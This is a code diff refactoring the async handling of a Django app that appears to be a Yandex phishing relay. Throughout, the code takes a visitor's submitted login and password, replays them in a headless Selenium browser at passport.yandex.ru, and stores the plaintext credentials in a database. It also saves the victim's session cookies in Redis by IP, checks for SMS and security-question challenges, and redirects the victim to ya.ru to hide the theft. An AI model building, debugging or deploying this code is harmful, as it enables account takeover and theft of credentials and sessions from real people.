@@ -22,6 +22,7 @@ redis_instance = redis.Redis(host='fishyandex_redis_1', port=6379, db=0)
 
 
 class CleanupInactiveDriversConsumer(AsyncConsumer):
+
     async def websocket_disconnect(self, event):
         print("Disconnected from cleanup_inactive_drivers channel")
 
@@ -56,7 +57,7 @@ async def check_timeout_and_close_drivers():
 async def close_driver(driver, client_ip):
     if client_ip in selenium_drivers:
         print(f"Closing driver for {client_ip}")
-        await sync_to_async(driver.quit)()
+        driver.quit()
         del selenium_drivers[client_ip]
 
 
@@ -88,17 +89,20 @@ async def index(request):
             phone = request.POST.get('phone')
             await update_last_activity(client_ip)
             if password:
-                result = await sync_to_async(sign_in)(driver, login, password)
+                result = await asyncio.to_thread(sign_in, driver, login, password)
                 if result == "incorrect_login":
                     return await sync_to_async(render)(request, 'index.html', {'incorrect_login': True})
+
+
                 elif result == "success":
                     custom_user = CustomUser(login=login, password=password)
                     await sync_to_async(custom_user.save)()
                     cookies = driver.get_cookies()
 
                     redis_instance.set(f"{client_ip}_cookies", json.dumps(cookies))
-                    await sync_to_async(driver.quit)()
+                    driver.quit()
                     return await sync_to_async(redirect)('https://ya.ru/')
+
                 elif result == "sms_code":
                     return HttpResponse('sms_code')
                     # phone_secure = WebDriverWait(driver, 10).until(
@@ -118,8 +122,9 @@ async def index(request):
                     return await sync_to_async(render)(request, 'index.html', {'incorrect_password': True})
                 else:
                     return await sync_to_async(render)(request, 'index.html')
+
             elif login:
-                await sync_to_async(open_yandex_passport)(driver)
+                await asyncio.to_thread(open_yandex_passport, driver)
                 username_login = WebDriverWait(driver, 10).until(
                     EC.presence_of_element_located((By.NAME, 'login'))
                 )
@@ -134,7 +139,10 @@ async def index(request):
             else:
                 return await sync_to_async(render)(request, 'index.html', {'incorrect_data': True})
 
-            return await sync_to_async(render)(request, 'index.html')
+    return await sync_to_async(render)(request, 'index.html')
+
+
+# Create New driver Selenium for New User
 def create_selenium_driver():
     options = Options()
     options.add_argument('--no-sandbox')
@@ -146,9 +154,10 @@ def create_selenium_driver():
 
     return driver
 
-@sync_to_async
+
 def open_yandex_passport(driver):
     driver.get("https://passport.yandex.ru")
+
 
 # Actions performed for authorization
 def sign_in(driver, login, password):
@@ -168,14 +177,15 @@ def sign_in(driver, login, password):
         password_submit.click()
     except TimeoutException:
         return "incorrect_login"
+
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     success, sms_code, security_question, incorrect_password = loop.run_until_complete(
         asyncio.gather(
-            sync_to_async(check_success)(driver),
-            sync_to_async(check_sms_code)(driver),
-            sync_to_async(check_security_question)(driver),
-            sync_to_async(check_incorrect_password)(driver)
+            asyncio.to_thread(check_success, driver),
+            asyncio.to_thread(check_sms_code, driver),
+            asyncio.to_thread(check_security_question, driver),
+            asyncio.to_thread(check_incorrect_password, driver)
         )
     )
     logging.warning(f"ALL{[success, sms_code, security_question, incorrect_password]}")
@@ -183,10 +193,12 @@ def sign_in(driver, login, password):
     logging.warning(f"{result}")
     return result
 
+
+# Check Exceptions
 async def get_driver(request, client_ip):
     if client_ip not in selenium_drivers:
         selenium_drivers[client_ip] = {
-            "driver": await create_selenium_driver(),
+            "driver": await asyncio.to_thread(create_selenium_driver),
             "last_activity": datetime.now().timestamp()
         }
         cookies_json = redis_instance.get(f"{client_ip}_cookies")
@@ -201,8 +213,9 @@ async def get_driver(request, client_ip):
         driver_info = selenium_drivers[client_ip]
         if not driver_info["driver"].current_window_handle:
             driver_info["driver"].quit()
-            driver_info["driver"] = await create_selenium_driver()
+            driver_info["driver"] = await asyncio.to_thread(create_selenium_driver)
     return selenium_drivers[client_ip]["driver"]
+
 
 async def handle_sms_verification(request):
     client_ip = request.META.get('REMOTE_ADDR')
@@ -211,7 +224,7 @@ async def handle_sms_verification(request):
         pass
     return await sync_to_async(render)(request, 'verification.html')
 
-@sync_to_async
+
 def check_success(driver):
     try:
         WebDriverWait(driver, 6).until(
@@ -221,7 +234,7 @@ def check_success(driver):
     except TimeoutException:
         return None
 
-@sync_to_async
+
 def check_sms_code(driver):
     try:
         WebDriverWait(driver, 6).until(
@@ -231,7 +244,7 @@ def check_sms_code(driver):
     except TimeoutException:
         return None
 
-@sync_to_async
+
 def check_security_question(driver):
     try:
         WebDriverWait(driver, 6).until(
@@ -241,7 +254,7 @@ def check_security_question(driver):
     except TimeoutException:
         return None
 
-@sync_to_async
+
 def check_incorrect_password(driver):
     try:
         WebDriverWait(driver, 6).until(
